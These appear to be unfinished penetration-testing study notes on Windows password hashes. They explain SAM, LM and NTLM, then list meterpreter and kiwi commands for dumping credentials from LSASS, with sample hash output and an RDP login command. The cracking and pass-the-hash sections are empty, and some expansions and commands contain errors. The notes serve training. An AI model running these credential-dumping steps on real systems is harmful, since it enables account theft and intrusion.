# Windows: Dump & Crack Password Hashes

## Contents
- []()
- []()
- []()
- []()
- []()
- []()
- []()
- []()
- []()
- []()

## Intro

### Windows Password Hashes
- The Windows O/S stores hashed user account passwords locally in the SAM database.
  - `SAM` : Security Accounts Manager
- Hashing is the process of converting a piece of data into another value. A hashing function or algorith is used to generate the new value. The result of a hashing algorithm is know as a **_hash_** or a **_hash value_**.
- Authentication and verification of user credentials is facilitated by the LSA.
  - `LSA` : Local Security Authority
- This all ties into the LSASS process.
  - `LSASS` : Local Security Authority Subsystem Service
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
  - `LM` : LAN Manager authentication protocol
  - `NTLM` : Network Trust Level Manager
- Windows disabled LM hashing and utilizes NTLM hashing from Windows Vista onward. 

### SAM Database
- The SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
  - The SAM database on Windows is similar to the `/etc/shadow` file on Linux
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  - **NOTE:** Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
  - You're probably going to need PrivEsc to be able to dump hashes.
- In modern versions of Windows, the SAM database is encrypted with a `syskey`.

### LM (LanMan -- LAN Manager authentication protocol)
- LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.
- The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
  - The password is broken into two seven-character chunks.
  - All characters are then converted into uppercase.
  - Each chunk is then hashed separated with the DES algorithm.
- LM hashing is generally considered to be a **_weak protocol_** and can easily be cracked, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes.

### NTLM Hash (or just NTHash)
- NTML is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
  - Does not split the hash into two chunks
  - Case sensitive
  - Allows the use of symbols and unicode characters
- These hashes are stored in the SAM database.
- NTHashes do not use salts. Therefore they can be cracked relatively easily (brute-force or rainbow table).

### Dumping & Cracking NTLM Hashes
- We can dump Windows password hashes by leveraging various utilities like...
  - `hashdump` : meterpreter built-in command
  - `mimikatz`
  - `kiwi` : mimikatz module in MetaSploit
- Then we can try to crack those hashes with...
  - John the Ripper
  - Hashcat
- If we cannot crack the hashes, we can try a pass-the-hash with PsExec or CrackMapExec.

----
## Dump Hashes

### Scenario & Set-Up
- You compromised a Windows target with MetaSploit and have a meterpreter session.
- Do some basic initial enumeration:
```
> sysinfo
> migrate [lsass process number]
  # Since we are going to be interacting with the LSASS process, migrate to that specific process
  # This gives us a 64-bit meterpreter session on the target 64-bit architecture (more stable)
  # This gives us more stability when interacting with the LSASS process to dump hashes.
> getuid
  # if we have access as Administrator, no privesc needed
> getprivs
  # confirm we have admin privs
```

### Meterpreter Command: hashdump

#### The command
- From your meterpreter session, issue the command...
```
hashdump
```
- You can run the same thing via the MSF module `post/windows/gather/hashdump`
- The hashdump post module will dump the contents of the SAM database ([resource](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#hashdump)).

#### The Format
- Observe the format of the output... (colon delimited)
```
Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
# Field #1: username   : Administrator
# Field #2: RID        : 500
# Field #3: LM Hash    : b512c1f3a8c0e7241aa818381e4e751b
# Field #4: NTLM Hash  : 1891f4775f676d4d10c09c1225a5c0a3
```
- Field #1: username
- Field #2: RID (Relative Identification), which is the last 3-4 digits of the SID (Security Identifier)
- Field #3: LM Hash
- Field #4: NTLM Hash

#### Copy Results
- Copy the results you want to crack into a text file (e.g., hashes.txt)
```
Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Meterpreter Built-In Extension: Kiwi
> Assuming the same scenario: you have compromised a Windows target with MetaSploit and currently have access via a meterpreter session. Because we are dinkin' around with the LSA, we should migrate our meterpreter session to lsass.exe. That will be more stable.
- Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk (uploading mimiktaz.exe to the target will save it to the hard drive).
```
> load kiwi
> help              # at the bottom of the help file you will get the kiwi module help
> creds_all         # retrieve all credentials
> lsa_dump_sam      # dump the sam database contents
> lsa_dump_secrets  # dump the lsa secrets (unparsed)
```
- This will give you the same results as `hashdump` above (copy into a text file: hashes.txt).

### Mimikatz on the Target
> Same scenario... If you wanted, you could upload the mimikatz Windows executable to the target (onto the target's hard drive).





----
## Crack Hashes

### John the Ripper

### Hashcat

----
## Use the Hashes
- If RDP port 3389 is open on the target machine, use xfreerdp to log in remotely
```
xfreerpd /u:Administrator /p:password /v:[target ip]
```

----
## Pass-the-Hash

